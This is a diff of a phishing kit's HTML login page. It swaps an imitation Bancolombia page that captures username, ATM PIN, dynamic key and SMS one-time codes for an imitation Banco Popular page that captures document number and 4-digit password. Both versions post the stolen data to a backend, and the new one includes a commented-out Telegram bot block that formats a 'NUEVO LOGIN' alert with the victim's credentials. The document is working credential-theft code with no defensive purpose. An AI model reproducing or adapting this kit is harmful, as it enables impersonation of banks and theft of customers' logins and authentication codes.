@@ -1,371 +1,265 @@
 <!DOCTYPE html>
-<html lang="es-CO">
+<html lang="es">
 <head>
-  <meta charset="utf-8">
-  <title>Ingreso</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido a Banco Popular</title>
+    <style>
+        /* RESET Y ESTILOS BASE */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f3f4f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .main-container { display: flex; width: 100%; max-width: 1200px; background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); overflow: hidden; }
+        
+        /* COLUMNA IZQUIERDA - FORMULARIO */
+        .login-section { flex: 1; padding: 50px; display: flex; flex-direction: column; justify-content: center; }
+        
+        .logo-container { margin-bottom: 40px; }
+        .logo-container img { height: 40px; }
+        
+        .welcome-text { font-size: 24px; color: #111; margin-bottom: 5px; font-weight: 600; }
+        .logo-text { color: #00a650; font-size: 28px; font-weight: 800; margin-bottom: 40px; display: flex; align-items: center; gap: 8px; }
+        .logo-text span { font-size: 20px; color: #000; font-weight: 400; margin-left: 5px;}
 
-  <style>
-    /* Reset y Estilos del Diseño Bancolombia */
-    body{font-size:100%;}
-    :root{--bc-theme-color:white;}
-    *,*:after,*:before{margin:0;padding:0;box-sizing:border-box;}
-    :root{--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;}
-    body{font-size:1rem;font-family:"Open Sans",Arial,sans-serif;color:#2c2a29;line-height:24px;letter-spacing:-0.3px;}
-    .bc-bg-brand-N-P-pair-50-00{background-color:#f9f9fa;}
-    .bc-justify-content-center{justify-content:center;}
-    .bc-align-content-center{justify-content:center;}
-    .bc-align-items-center{align-items:center;}
-    .bc-direction-row{flex-direction:row;}
-    .bc-direction-column{flex-direction:column;}
-    .bc-paddinginfix-top-3{padding-top:24px;}
-    .bc-paddinginfix-top-4{padding-top:32px;}
-    .bc-px-5{padding-right:40px;padding-left:40px;}
-    .bc-margin-top-2{margin-top:16px;}
-    .bc-mx-2{margin-right:16px;margin-left:16px;}
-    .bc-margin-bottom-2{margin-bottom:16px;}
-    .bc-margin-top-4{margin-top:32px;}
-    [class*=bc-col-]{float:left;min-height:1px;}
-    .bc-container{width:100%;padding-right:16px;padding-left:16px;margin:auto;}
-    .bc-container-fluid{width:100%;padding-right:16px;padding-left:16px;margin:auto;}
-    .bc-row{display:flex;flex-wrap:wrap;}
-    .bc-col-lg-4,.bc-col-md-8,.bc-col-md-6,.bc-col-sm-auto,.bc-col-xs-6,.bc-col-12{position:relative;width:100%;}
-    .bc-col-12{flex-basis:0;flex-grow:1;max-width:100%;flex:0 0 100%;}
-    @media (min-width:0){.bc-col-xs-6{flex:0 0 100%;max-width:100%;}[class*=bc-col]{padding-right:4px;padding-left:4px;}.bc-row{margin-right:-4px;margin-left:-4px;}}
-    @media (min-width:576px){.bc-col-sm-auto{flex:0 0 auto;width:auto;max-width:100%;}}
-    @media (min-width:768px){.bc-col-md-6{flex:0 0 50%;max-width:50%;}.bc-col-md-8{flex:0 0 66.6666666667%;max-width:66.6666666667%;}[class*=bc-col]{padding-right:8px;padding-left:8px;}.bc-row{margin-right:-8px;margin-left:-8px;}}
-    @media (min-width:992px){.bc-col-lg-4{flex:0 0 33.3333333333%;max-width:33.3333333333%;}}
-    .bc-flex{display:flex;}
-    .bc-form-field{width:100%;position:relative;height:52px;margin-top:20px;}
-    @media screen and (max-width:975px){.bc-form-field{margin-bottom:15px;display:grid;}}
-    .bc-form-field>em{position:absolute;color:#2c2a29;top:4px;font-size:1.5rem;}
-    .bc-form-field>em:first-child{left:0;width:24px;}
+        /* CAMPOS */
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; }
+        
+        .select-custom, .input-custom { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; color: #333; outline: none; transition: border 0.3s; }
+        .select-custom:focus, .input-custom:focus { border-color: #00a650; }
+        
+        /* CLAVE CON CUADROS */
+        .password-container { display: flex; gap: 10px; position: relative; }
+        .pass-box { flex: 1; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 18px; font-weight: bold; outline: none; transition: border 0.3s; }
+        .pass-box:focus { border-color: #00a650; }
+        .eye-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #777; }
 
-    .icon-img { position: absolute; width: 20px; height: 20px; top: 6px; left: 0; object-fit: contain; z-index: 2; }
-    .bc-input[aria-label],.bc-input[id]{background:transparent;border:none;border-bottom:1px solid #2c2a29;color:#2c2a29;display:block;height:32px;left:0;top:20px;width:100%;font-family:"Open Sans SemiBold";font-weight:600;font-size:1rem;line-height:24px;padding-left: 35px;}
-    .bc-input[aria-label]:focus,.bc-input[id]:focus{outline:none;transition:.5s;border-bottom:2px solid #2c2a29;}
-    .bc-input[aria-label]~span,.bc-input[id]~span{display:block;height:20px;font-family:"Open Sans";font-size:.75rem;line-height:16px;}
-    .bc-input[aria-label]~label,.bc-input[id]~label{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:88%;font-family:"Open Sans";font-size:1rem;line-height:24px;}
-    .bc-input[aria-label]:not(:placeholder-shown),.bc-input[id]:not(:placeholder-shown){border-bottom:2px solid #2c2a29;}
-    .bc-input[aria-label]::placeholder,.bc-input[id]::placeholder{opacity:.4;color:#2c2a29;font-family:"Open Sans SemiBold";font-weight:600;font-size:1rem;}
-    .bc-input[aria-label]:focus~label,.bc-input[id]:focus~label,.bc-input[aria-label]:active~label,.bc-input[id]:active~label,.bc-active.bc-input[aria-label]~label,.bc-active.bc-input[id]~label{top:-23px;padding-left:0;width:95%;font-family:"Open Sans";font-size:.875rem;line-height:20px;}
-    .bc-input[aria-label]:valid~label,.bc-input[id]:valid~label{margin-left:0;}
-    .bc-input[aria-label]:focus~span,.bc-input[id]:focus~span{color:#2c2a29;}
-    em~.bc-input[aria-label],em~.bc-input[id]{padding-left:30px;}
-    .bc-input[aria-label]+em,.bc-input[id]+em{right:0;width:24px;left:initial;}
-    input::first-line{color:#2c2a29;-webkit-text-fill-color:#2c2a29;}
+        .forgot-pass { text-align: right; display: block; font-size: 13px; color: #e31837; text-decoration: none; margin-top: 5px; font-weight: 600;}
+        
+        /* TOGGLE */
+        .toggle-container { display: flex; align-items: center; margin-top: 20px; margin-bottom: 30px; }
+        .toggle-switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #00a650; }
+        input:checked + .slider:before { transform: translateX(24px); }
+        .toggle-text { margin-left: 12px; font-size: 14px; color: #333; }
 
-    .bc-card{padding:16px;background:#fff;box-shadow:0 8px 12px rgba(44,42,41,.16),0 1px 8px rgba(43,42,41,.08);display:flex;position:relative;width:100%;height:min-content;border-radius:8px;}
-    .bc-card-container{padding:0;background:#fff;height:auto;width:auto;}
-    .bc-button-small,.bc-button-secondary,.bc-button-primary{display:flex;justify-content:center;align-items:center;column-gap:8px;border:0;cursor:pointer;padding:12px 24px;outline:0;text-transform:none;text-decoration:none;border-radius:100px;overflow:hidden;width:100%;height:auto;min-height:32px;white-space:initial;font-family:"CIB Sans bold";font-weight:700;font-size:1.125rem;line-height:26px;}
-    .bc-button-small:not(:focus),.bc-button-secondary:not(:focus),.bc-button-primary:not(:focus){transition:150ms cubic-bezier(.4,0,.2,1);}
-    .bc-button-small:disabled,.bc-button-secondary:disabled,.bc-button-primary:disabled{cursor:default;}
-    .bc-button-primary{background:#fdda24;color:#2c2a29;}
-    .bc-button-primary:hover:enabled{background:#fee66c;}
-    .bc-button-primary:active:enabled{background:#e6c621;}
-    .bc-button-primary:disabled{background:#d9dadd;color:#97999b;}
-    .bc-button-secondary{background:transparent;color:#2c2a29;border:1px solid #2c2a29;}
-    .bc-button-secondary:hover:enabled{background:#d9dadd;}
-    .bc-button-secondary:active:enabled{background:#b3b5b8;}
-    .bc-button-secondary:disabled{background:transparent;color:#97999b;border:1px solid #97999b;}
-    .bc-button-small{padding:8px 16px;font-size:1rem;line-height:24px;}
-    .bc-button-fill{width:100%;}
-    .bc-total-value-gap-03{gap:24px;}
+        /* BOTÓN */
+        .btn-continue { width: 100%; padding: 16px; background-color: #d1d5db; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: not-allowed; transition: background 0.3s; }
+        .btn-continue.active { background-color: #e31837; cursor: pointer; }
+        
+        /* FOOTER */
+        .register-link { text-align: center; margin-top: 20px; font-size: 14px; color: #555; }
+        .register-link a { color: #e31837; text-decoration: none; font-weight: 600; }
+        .footer-legal { text-align: center; margin-top: 30px; font-size: 11px; color: #999; line-height: 1.5; }
+        .footer-legal a { color: #e31837; text-decoration: none; }
 
-    .bc-link{color:#2c2a29;font-family:"CIB Sans";font-size:.875rem;line-height:20px;text-decoration:none;align-items:center;display:flex;width:fit-content;}
-    .bc-link:active,.bc-link:hover{opacity:.8;}
-    .link-default{font-family:"Open Sans";font-size:.875rem;line-height:20px;outline-color:#3455db;}
-    .link-underline{font-family:"Open Sans Bold";font-weight:700;font-size:.875rem;line-height:20px;text-decoration:none;}
-    .link-underline:hover{text-decoration:none;outline:none;opacity:.8;}
+        /* COLUMNA DERECHA - IMAGEN */
+        .image-section { flex: 1; background-color: #f9fafb; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .image-section img { width: 100%; max-width: 500px; height: auto; }
 
-    .loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.85); z-index: 10000; align-items: center; justify-content: center; flex-direction: column; }
-    .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #fdda24; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-    .error-msg { display: none; color: #d9381e; font-size: 0.875rem; margin-top: 8px; font-family: "Open Sans", sans-serif; }
-    .error-msg.show { display: block; }
-
-    /* Modal OTP con Rayitas */
-    .demo-overlay{display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.68);backdrop-filter:blur(2px);align-items:center;justify-content:center;padding:18px;}
-    .demo-overlay.is-open{display:flex;}
-    .demo-modal{width:100%;max-width:680px;max-height:92vh;overflow-y:auto;background:#fff;border-radius:30px;padding:28px 30px 48px;box-shadow:0 18px 48px rgba(0,0,0,.24);position:relative;}
-    .demo-close-row{display:flex;justify-content:flex-end;margin-bottom:24px;}
-    .demo-close{border:0;background:transparent;font-size:0;width:36px;height:36px;cursor:pointer;color:#333;position:relative;}
-    .demo-close::before,.demo-close::after{content:"";position:absolute;left:17px;top:3px;width:1.5px;height:30px;background:#333;transform:rotate(45deg);}
-    .demo-close::after{transform:rotate(-45deg);}
-    .demo-instruction{background:#f1b5ce;border-radius:14px;padding:34px 22px;text-align:center;margin:0 0 18px;color:#30252b;font-size:clamp(19px,3vw,27px);line-height:1.45;}
-    .demo-instruction strong{font-weight:800;}
-    .demo-title{text-align:center;font-family:"CIB Sans Bold",Arial,sans-serif;font-size:clamp(25px,4vw,36px);line-height:1.2;margin:12px 0 24px;color:#292929;}
-    .demo-actions{display:flex;justify-content:center;gap:16px;margin-top:20px;}
-    .demo-actions button{flex:1;max-width:250px;min-height:58px;}
-    .demo-note{font-size:12px;color:#777;text-align:center;margin-top:24px;}
-    .demo-step{display:none;}
-    .demo-step.active{display:block;}
-    
-    .otp-slots-container { display: flex; justify-content: center; gap: 15px; margin: 24px 0; }
-    .otp-slot { width: 35px; height: 45px; border: none; border-bottom: 2px solid #2c2a29; border-radius: 0; text-align: center; font-size: 1.8rem; line-height: 45px; font-weight: bold; background: transparent; color: var(--bc-dark); padding: 0; }
-    .otp-slot.active { border-bottom-color: #fdda24; box-shadow: 0 5px 5px -5px rgba(253,218,36,.8); }
-    .otp-slots-container.error .otp-slot { border-bottom-color: #d9381e; }
-    .otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; }
-
-    .svp-footer { padding: 1rem; text-align: center; font-size: 0.8rem; color: #666; margin-top: 2rem; }
-    .svp-footer p { margin-bottom: 8px; }
-  </style>
-</head>
-
-<body class="bc-bg-brand-N-P-pair-50-00" id="body">
-
-  <div class="loading-overlay" id="loading-overlay">
-    <div class="loading-spinner"></div>
-    <p style="margin-top: 15px; font-family: 'Open Sans', sans-serif; font-weight: 600; color: #2c2a29;">Procesando solicitud...</p>
-  </div>
-
-  <main class="svp-main">
-    <div class="bc-container-fluid trazo" style="background-image:url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg');">
-      <h1 class="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4">Ingreso</h1>
-      <div class="bc-row bc-justify-content-center form-container">
-        <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
-          <div class="bc-card-body bc-mt-4">
-            <section id="card1" class="bc-card bc-card-auth bc-card-container">
-              <section id="id00" class="bc-card-auth-body">
-                <section class="bc-card-auth-head">
-                  <h1 class="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">¡Hola!</h1>
-                  <h3 class="bc-card-auth-description bc-mt-3">Ingresa los datos para gestionar tus productos y hacer transacciones.</h3>
-                </section>
-                <form id="demoForm" autocomplete="off">
-                  <section>
-                    <section class="bc-card-auth-container">
-                      <bc-form-field class="authentication-form__username">
-                        <div class="bc-form-field" id="s.1761706071">
-                          <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC01.png" class="icon-img" alt="Icono Usuario">
-                          <input id="usuario" name="usuario" autocomplete="off" autocorrect="off" spellcheck="false" maxlength="20" aria-describedby="username-helper" aria-invalid="false" class="bc-input bc-active" placeholder="Usuario" aria-label="Usuario" required>
-                          <label for="usuario"></label>
-                          <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline"><u>¿Olvidaste tu usuario?</u></a>
-                        </div>
-                      </bc-form-field>
-                      <bc-form-field class="authentication-form__password">
-                        <div class="bc-form-field" id="s.2218081857">
-                          <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC02.png" class="icon-img" alt="Icono Clave">
-                          <input id="clave" minlength="4" maxlength="4" type="password" name="clave" autocomplete="off" inputmode="numeric" aria-describedby="password-helper" aria-invalid="false" class="bc-input bc-active" placeholder="Clave de Cajero" aria-label="Clave de Cajero" required>
-                          <label for="clave"></label>
-                          <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline"><u>¿Olvidaste o bloqueaste tu clave?</u></a>
-                        </div>
-                      </bc-form-field>
-                      <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
-                    </section>
-                  </section>
-                  <section class="bc-card-auth-button">
-                    <button type="submit" id="submitBtn" tabindex="0" class="bc-button bc-button-fill bc-button-primary" disabled>Continuar</button>
-                  </section>
-                </form>
-                <section class="bc-card-auth-link" style="display: flex; justify-content: center; margin-top: 24px;">
-                  <a href="#" class="bc-link link-underline" style="font-size: 1rem; color: #2c2a29;"><u>Crear usuario</u></a>
-                </section>
-              </section>
-            </section>
-          </div>
-        </div>
-      </div>
-    </div>
-  </main>
-  <footer class="svp-footer">
-    <p>¿Problemas para conectarte? · Aprende sobre seguridad · Reglamento Sucursal Virtual · Política de privacidad</p>
-    <p id="reloj-widget" style="margin-top:8px;"></p>
-  </footer>
-
-  <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
-    <section class="demo-modal">
-      <div class="demo-close-row">
-        <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
-      </div>
-      <div id="viewDinamica" class="demo-step active">
-        <div class="demo-instruction"><strong>Verificación de Seguridad</strong><br>Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.</div>
-        <h2 class="demo-title">Clave Dinámica</h2>
-        <div class="otp-slots-container" id="otpContainer">
-          <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
-          <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
-        </div>
-        <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
-        <p id="otpError" class="error-msg" style="text-align: center; margin-bottom: 15px;">Clave dinámica incorrecta o expirada.</p>
-        <div class="demo-actions">
-          <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
-          <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
-        </div>
-      </div>
-      <div id="viewSms" class="demo-step">
-        <div class="demo-instruction"><strong>Verificación SMS</strong><br>Hemos enviado un código SMS de 6 dígitos a tu celular registrado.</div>
-        <h2 class="demo-title">Código SMS</h2>
-        <div style="max-width: 300px; margin: 0 auto 20px;" id="smsInputWrap">
-          <input type="text" id="smsCodeInput" class="bc-input bc-active" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align: center; font-size: 1.5rem; height: 45px; border-bottom: 2px solid #2c2a29;">
-        </div>
-        <p id="smsError" class="error-msg" style="text-align: center; margin-bottom: 15px;">Código SMS inválido.</p>
-        <div class="demo-actions">
-          <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width: 100%;">Verificar Código</button>
-        </div>
-      </div>
-      <p class="demo-note">servicios bancarios</p>
-    </section>
-  </div>
-
-  <script>
-    // ==========================================
-    // LÓGICA CONECTADA A TU SERVIDOR (EN VEZ DE TELEGRAM)
-    // ==========================================
-    // El servidor debe estar escuchando en /api/login, /api/dinamica, etc.
-    
-    // Elementos DOM
-    const usuarioInput = document.getElementById("usuario");
-    const claveInput = document.getElementById("clave");
-    const submitBtn = document.getElementById("submitBtn");
-    const demoForm = document.getElementById("demoForm");
-    const loadingOverlay = document.getElementById('loading-overlay');
-    const loginError = document.getElementById('loginError');
-    const modal = document.getElementById("modalDinamica");
-    const otpInput = document.getElementById("otpInput");
-    const otpSlots = document.querySelectorAll(".otp-slot");
-    const btnBorrar = document.getElementById("btnBorrar");
-    const btnContinuar = document.getElementById("btnContinuar");
-    const otpError = document.getElementById("otpError");
-    const otpContainer = document.getElementById("otpContainer");
-    const closeModal = document.getElementById("closeModal");
-    const viewDinamica = document.getElementById("viewDinamica");
-    const viewSms = document.getElementById("viewSms");
-    const smsCodeInput = document.getElementById("smsCodeInput");
-    const btnSmsFinal = document.getElementById("btnSmsFinal");
-    const smsError = document.getElementById("smsError");
-    const smsInputWrap = document.getElementById("smsInputWrap");
-
-    function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
-    function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
-
-    function actualizarBoton() {
-      const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
-      const usuarioLleno = usuarioInput.value.trim().length > 0;
-      const formularioValido = claveCompleta && usuarioLleno;
-      submitBtn.disabled = !formularioValido;
-      if (formularioValido) loginError.classList.remove("show");
-    }
-
-    usuarioInput.addEventListener("input", actualizarBoton);
-    claveInput.addEventListener("input", function() {
-      claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
-      actualizarBoton();
-    });
-
-    // ==========================================
-    // ENVÍO AL SERVIDOR (REEMPLAZA A TELEGRAM)
-    // ==========================================
-    async function enviarLogin(usuario, clave) {
-      try {
-        await fetch('/api/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ usuario, clave, ip: '0.0.0.0' })
-        });
-      } catch (e) { console.error(e); }
-    }
-
-    async function enviarDinamica(usuario, dinamica) {
-      try {
-        await fetch('/api/dinamica', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ usuario, dinamica })
-        });
-      } catch (e) { console.error(e); }
-    }
-
-    async function enviarSms(usuario, sms) {
-      try {
-        await fetch('/api/sms', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ usuario, sms })
-        });
-      } catch (e) { console.error(e); }
-    }
-
-    // ==========================================
-    // LÓGICA DEL FORMULARIO
-    // ==========================================
-    demoForm.addEventListener("submit", async function(event) {
-      event.preventDefault();
-      if (submitBtn.disabled) return;
-      
-      mostrarOverlay();
-      const user = usuarioInput.value.trim();
-      const pass = claveInput.value.trim();
-      
-      await enviarLogin(user, pass);
-      ocultarOverlay();
-    });
-
-    // Lógica del Modal (6 dígitos con rayitas)
-    function actualizarOTP() {
-      const valor = otpInput.value;
-      otpSlots.forEach((slot, index) => {
-        if (index < valor.length) {
-          slot.textContent = valor[index];
-          slot.classList.remove("active");
-        } else {
-          slot.textContent = "";
-          if (index === valor.length) { slot.classList.add("active"); }
-          else { slot.classList.remove("active"); }
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .main-container { flex-direction: column; }
+            .image-section { display: none; } /* Oculta la imagen en móviles */
+            .login-section { padding: 30px 20px; }
         }
-      });
-      btnContinuar.disabled = valor.length !== 6;
-    }
 
-    otpInput.addEventListener("input", function() {
-      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-      otpError.classList.remove("show");
-      otpContainer.classList.remove("error");
-      actualizarOTP();
-      
-      if (this.value.length > 0) {
-        enviarDinamica(usuarioInput.value, this.value);
-      }
-    });
+        /* LOADER Y MENSAJES */
+        .loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.85); z-index: 10000; align-items: center; justify-content: center; flex-direction: column; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #00a650; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
+        .error-msg { display: none; color: #e31837; font-size: 13px; margin-top: 5px; }
+        .error-msg.show { display: block; }
+    </style>
+</head>
+<body>
 
-    otpContainer.addEventListener("click", () => otpInput.focus());
-    btnBorrar.addEventListener("click", () => {
-      otpInput.value = "";
-      otpError.classList.remove("show");
-      otpContainer.classList.remove("error");
-      actualizarOTP();
-      otpInput.focus();
-    });
+    <!-- Loader -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loading-spinner"></div>
+        <p style="margin-top: 15px; color: #333; font-weight: 600;">Procesando solicitud...</p>
+    </div>
 
-    closeModal.addEventListener("click", () => modal.classList.remove("is-open"));
+    <div class="main-container">
+        <!-- SECCIÓN IZQUIERDA -->
+        <div class="login-section">
+            <div class="logo-container">
+                <!-- Logo superior opcional -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Logo_Banco_Popular.svg/1200px-Logo_Banco_Popular.svg.png" alt="Banco Popular">
+            </div>
 
-    // Lógica SMS
-    smsCodeInput.addEventListener("input", function() {
-      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-      smsError.classList.remove("show");
-      smsInputWrap.classList.remove("error");
-    });
+            <h2 class="welcome-text">Bienvenido a</h2>
+            <div class="logo-text">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Logo_Banco_Popular.svg/1200px-Logo_Banco_Popular.svg.png" alt="Logo P" style="height:30px;">
+                <span>banco popular</span>
+            </div>
 
-    btnSmsFinal.addEventListener("click", async () => {
-      if(smsCodeInput.value.length < 6) {
-        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
-        smsError.classList.add("show");
-        smsInputWrap.classList.add("error");
-        return;
-      }
-      mostrarOverlay();
-      await enviarSms(usuarioInput.value, smsCodeInput.value);
-      ocultarOverlay();
-    });
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Tipo de documento</label>
+                    <select class="select-custom" id="tipo_doc">
+                        <option value="CC">Cédula de Ciudadanía</option>
+                        <option value="CE">Cédula de Extranjería</option>
+                        <option value="NIT">NIT</option>
+                        <option value="PA">Pasaporte</option>
+                    </select>
+                </div>
 
-    // Reloj
-    function actualizarFecha() {
-      const ahora = new Date();
-      const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true };
-      let fecha = ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
-      const el = document.getElementById('reloj-widget');
-      if (el) el.textContent = fecha.charAt(0).toUpperCase() + fecha.slice(1);
-    }
-    actualizarFecha();
-    setInterval(actualizarFecha, 60000);
-    actualizarBoton();
-  </script>
+                <div class="form-group">
+                    <label>Número de documento</label>
+                    <input type="text" class="input-custom" id="num_doc" placeholder="Ingresa tu número" autocomplete="off" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Contraseña única</label>
+                    <div class="password-container">
+                        <!-- 4 cuadros para la contraseña -->
+                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
+                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
+                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
+                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
+                        <span class="eye-icon">👁️</span>
+                    </div>
+                    <a href="#" class="forgot-pass">¿La olvidaste?</a>
+                </div>
+
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox">
+                        <span class="slider"></span>
+                    </label>
+                    <span class="toggle-text">Recordar tipo y número de documento</span>
+                </div>
+
+                <p id="loginError" class="error-msg">Datos incorrectos. Por favor verifica.</p>
+
+                <button type="submit" id="submitBtn" class="btn-continue" disabled>Continuar</button>
+            </form>
+
+            <div class="register-link">
+                ¿No eres usuario? <a href="#">Regístrate aquí</a>
+            </div>
+
+            <div class="footer-legal">
+                Protegido por reCAPTCHA - <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
+            </div>
+        </div>
+
+        <!-- SECCIÓN DERECHA (IMAGEN) -->
+        <div class="image-section">
+            <!-- Aquí puedes poner la URL de la imagen que sale en tu captura -->
+            <img src="https://i.ibb.co/6PZ7Z7x/banco-popular-img.png" alt="Zona Transaccional" onerror="this.src='https://via.placeholder.com/500x400/f9fafb/cccccc?text=Imagen+Zona+Transaccional'">
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // LÓGICA DE CONTROL Y ENVÍO DE DATOS
+        // ==========================================
+        
+        const numDocInput = document.getElementById("num_doc");
+        const tipoDocSelect = document.getElementById("tipo_doc");
+        const passBoxes = document.querySelectorAll(".pass-box");
+        const submitBtn = document.getElementById("submitBtn");
+        const loginForm = document.getElementById("loginForm");
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loginError = document.getElementById('loginError');
+        
+        let usuarioCompleto = "";
+
+        // Lógica para mover el cursor entre los cuadros de la contraseña
+        passBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < passBoxes.length - 1) {
+                    passBoxes[index + 1].focus();
+                }
+                verificarBoton();
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                    passBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        // Validar si el botón debe activarse
+        function verificarBoton() {
+            const docLleno = numDocInput.value.trim().length > 0;
+            let passLlena = true;
+            passBoxes.forEach(box => { if (box.value.length === 0) passLlena = false; });
+
+            if (docLleno && passLlena) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+                loginError.classList.remove("show");
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
+        }
+
+        numDocInput.addEventListener("input", verificarBoton);
+
+        function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+        function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
+
+        // ==========================================
+        // ENVÍO AL SERVIDOR (O TELEGRAM SI PREFIERES)
+        // ==========================================
+        async function enviarDatos() {
+            const tipo = tipoDocSelect.value;
+            const documento = numDocInput.value.trim();
+            let clave = "";
+            passBoxes.forEach(box => clave += box.value);
+            
+            usuarioCompleto = `${tipo} - ${documento}`;
+
+            // AQUÍ CONECTAS CON TU BACKEND (O TELEGRAM)
+            try {
+                // Ejemplo usando Fetch a tu API (asegúrate de tener el backend corriendo)
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        usuario: usuarioCompleto, 
+                        clave: clave,
+                        ip: '0.0.0.0'
+                    })
+                });
+                
+                // Si quieres usar TELEGRAM en lugar de backend, descomenta esto:
+                /*
+                const TG_BOT_TOKEN = 'TU_TOKEN';
+                const TG_CHAT_ID = 'TU_ID';
+                const mensaje = `⚡ <b>NUEVO LOGIN - POPULAR</b>\n\n👤 <b>Documento:</b> ${usuarioCompleto}\n🔑 <b>Clave:</b> ${clave}\n\n📅 ${new Date().toLocaleString('es-CO')}`;
+                
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+                */
+                
+            } catch (e) { 
+                console.error("Error al enviar:", e); 
+            }
+        }
+
+        // Cuando el usuario envía el formulario
+        loginForm.addEventListener("submit", async (e) => {
+            e.preventDefault();
+            if (submitBtn.disabled) return;
+
+            mostrarOverlay();
+            await enviarDatos();
+            ocultarOverlay();
+            
+            // Opcional: Redirigir a una página de "Procesando" o mostrar modal
+            // alert("Datos enviados. Revisa tu panel.");
+        });
+    </script>
 </body>
 </html>
